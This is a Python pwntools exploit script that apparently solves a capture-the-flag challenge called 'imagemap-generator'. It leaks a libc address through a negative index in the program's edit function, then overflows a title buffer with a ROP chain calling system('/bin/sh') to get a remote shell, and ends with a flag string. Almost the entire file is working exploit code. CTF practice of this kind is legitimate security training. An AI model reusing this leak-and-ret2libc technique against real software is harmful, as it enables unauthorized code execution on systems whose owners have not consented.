#!/usr/bin/env python3
from pwn import *

exe = ELF("./generator_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

HOST="imagemap-generator.challs.sekai.team"
PORT=1337

context.binary = exe
context.log_level = 'debug'

gdbscript="""
b*0x0000000000401A11
b*0x0000000000401A83
b*0x0000000000401AFA
b*0x0000000000401BC3
b*0x0000000000401ff3
b*0x0000000000401c71
b*0x0000000000401BFB"""

def run():
    if args.LOCAL:
        p = process([exe.path])
        gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote(HOST, PORT)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)
rl = lambda: p.recvline().strip()
rn = lambda n: p.recvn(n)

def create(x, y, w, h, url, title):
    sna(b"choice: ", 1)
    sna(b"coordinate: ", x)
    sna(b"coordinate: ", y)
    sna(b"width: ", w)
    sna(b"height: ", h)
    sla(b"URL: ", url)
    sla(b"title: ", title)

def edit(idx, x, y, w, h, url, title):
    sna(b"choice: ", 3)
    sna(b"): ", idx)
    sna(b"): ", x)
    sna(b"): ", y)
    sna(b"): ", w)
    sna(b"): ", h)
    sla(b"): ", url)
    sla(b"): ", title)

def gen():
    sna(b"choice: ", 4)

sla(b": ", b"A")
create(0, 0, 1, 1, b"B", b"C")
sna(b"choice: ", 3)
sna(b"): ", -3)
sna(b"): ", 0)
sna(b"): ", 0)
sna(b"): ", 0)
ru(b"(current: ")
leak = int(rn(15).decode())
info(f"leak: {leak}")
libc.address = leak - 0x21aaa0
success(f"libc: {hex(libc.address)}")
sna(b"): ", 0)
sla(b"): ", b"A")
sla(b"): ", b"B")

rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols['system']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

payload = b"A"* 192 + p64(0xdeadbeef) + p64(pop_rdi) + p64(binsh) + p64(pop_rdi+1) + p64(system)
edit(18, 0, 0, 0, 0, b"A", payload)
sna(b"choice: ", 5)

p.interactive()

#osu{i_st1ll_d0nt_get_imagemaps}